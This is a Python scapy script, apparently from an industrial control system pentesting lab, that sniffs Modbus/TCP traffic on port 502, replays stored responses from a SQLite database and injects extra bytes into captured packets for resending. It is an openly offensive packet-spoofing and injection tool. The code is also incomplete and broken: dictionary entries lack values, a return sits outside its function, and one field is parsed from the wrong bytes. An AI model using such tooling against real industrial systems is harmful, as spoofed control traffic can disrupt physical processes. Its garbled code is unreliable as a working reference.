import sqlite3
from scapy.all import *

# Connect with sqlite database
conn = sqlite3.connect('/home/kali/ICSPentesting/ICSPentesting/Attack/modbus_data.db')
c = conn.cursor()

#Function to sniff Modbus frames
def sniffing(iface):
    flag = True
    while flag:
        Modbus_frames = sniff(iface = iface, filter = "tcp port 502", count = 2)
        Modbus_query = Modbus_frames[1]
        Modbus_ack = Modbus_frames[0]

        if Raw in Modbus_query: 
            modbus_data = Modbus_query[TCP].load
            if modbus_data[8:].hex() == "0001001103000000":
                print("Packet detected")
                flag = False
return Modbus_query, Modbus_ack


# Function to extract Modbus packet fields
def extract_modbus_data(pkt_ack, pkt_query):
    #Extract IP layer information and save it into a vector
    ip_layer = {
        'IP_src': pkt_ack[IP].src,
        'IP_dst': pkt_ack[IP].dst,
    }

    tcp_layer = {
        'Port_src': pkt_ack[TCP].sport,
        'Port_dst': pkt_ack[TCP].dport,
        'window': pkt_ack[TCP].window,
        'seq': pkt_ack[TCP].seq,
        'ack': pkt_ack[TCP].ack
    }

    modbus_tcp_layer = {
        'Transaction Identifier': 
        'Protocol Identifier': 
        'Length': 
        'Unit Identifier': 
    }

    modbus_layer = {
        'Function Code':
        'Reference Number':
        'Byte Count':
        'Data': 
    }





# Get Modbus response from database
def get_modbus_packet(transaction_id, client_id, function_code, packet_type):
    c.execute("SELECT * FROM modbus_data WHERE packet_type=? AND Transaction_Identifier=? AND Unit_Identifier=? AND Function_Code=?", (packet_type, transaction_id, client_id, function_code))
    packet = c.fetchone()
    if packet:
        return packet
    else:
        return None

# Function to inject data into Modbus packages 
def inject_data(pkt):
    pkt[TCP].load += b'\x00\x01\x02\x03' 
    
    return pkt






# Sniffing and injection
def sniff_and_inject(iface):
    def process_packet(pkt):
        if TCP in pkt and pkt[TCP].dport == 502: 
            # Check if the TCP packet has load
            if Raw in pkt:
                modbus_data = pkt[TCP].load
                if modbus_data[8:].hex() == "0001001103000000":
                    print ("Ultimo paquete capturado")



                    # Extract transaction_id and client_id from Modbus packet
                    transaction_id = modbus_data[:2].hex()
                    print("Transation_Identifier: ", transaction_id)
                    client_id = modbus_data[6:7].hex()
                    print("Client_Identifier: ", client_id)
                    function_code = modbus_data[6:7].hex()
                    print("Function Code: ", function_code)
                    
                    # Query database to get Modbus response 
                    response = get_modbus_packet(transaction_id, client_id, function_code, "Response")
                    if response:
                        # Print Modbus response
                        print("Modbus response:", response)

                        # Send response to client
                        sendp(response, iface=iface)
                    
                        # Inject data into the packet
                        pkt = inject_data(pkt)
                        
                        # Send modified packet to the server
                        #sendp(pkt, iface=iface)

    sniff(iface=iface, prn=process_packet, count=2)

sniff_and_inject('lo')



